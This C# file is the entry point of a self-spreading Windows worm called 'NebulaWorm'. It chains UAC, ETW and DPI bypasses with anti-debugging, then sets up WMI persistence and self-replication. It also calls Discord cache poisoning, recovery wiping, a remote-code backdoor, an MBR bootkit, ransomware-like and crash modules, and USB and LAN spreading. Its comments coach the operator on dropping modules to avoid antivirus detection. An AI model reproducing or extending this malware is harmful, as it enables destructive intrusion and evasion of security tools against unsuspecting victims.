using System;
using System.Threading.Tasks;

namespace NebulaWorm
{
    internal static class Program
    {
        private static readonly Random rnd = new Random();

        [STAThread]
        static async Task Main()
        {
            try
            {
                
                AntiDebug.CheckAndKill(); // no need for anything it does itself

                UACBypass.Start();

                await Task.Delay(800); //waiting to make sure UAC Bypass goes thru smooth without getting interrupted

                EtwBypass.ETWBypass();

                await Task.Delay(700); //for smooth bypass

                Unhook.RestoreNtdll();

                await Task.Delay(300); //for smooth bypass

                DPIBypass.Apply(); 

                await Task.Delay(500); //for smooth bypass

                string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                WMIPersistence.CreateWMIEventSubscription(exePath);

                SelfReplicator.CopyToAppDataIfNeeded();
                Persistence.Apply();

                Kill.CheckAndExecute(); //optional but added for controls

                Cpuload.Start(); //optional u can delete this call and the module

                SlowWi.Start();// optional module for fun 

                Discord.PoisonCache();

                CriticalProcess.MakeCritical(); // not bad but would raise suspicion

                AntiRecovery.Wipe(); //very suspicious and even gets the worm tagged as ransomware 

                RCE.Start(); //if u dont want to get tagged backdoor or reverse shell type of thing u can delete this and the RCE.cs

                BypassWin.Start(); // raises suspicion alot if u dont want to get detections delete the module and this call

                Bootkit.WriteBootkit();//risky module might get your mbr blown up

                await Task.Delay(700);
                WatchOver.Start(); // ransomware like module if u dont want to delete this and WatchOver.cs

                RandomShuts.Start();//delete this module if u want to be stealthy this module is for fun

                RBSOD.Start();//delete this module if u want to be stealthy this module is for fun

                while (true)
                {
                    UsbSpread.Spread();
                    await LanSpread.SpreadAsync();

                    int minutes = rnd.Next(1, 6);
                    int delayMs = minutes * 60 * 1000;
                    await Task.Delay(delayMs);
                }
            }
            catch
            {
            }
        }
    }
}
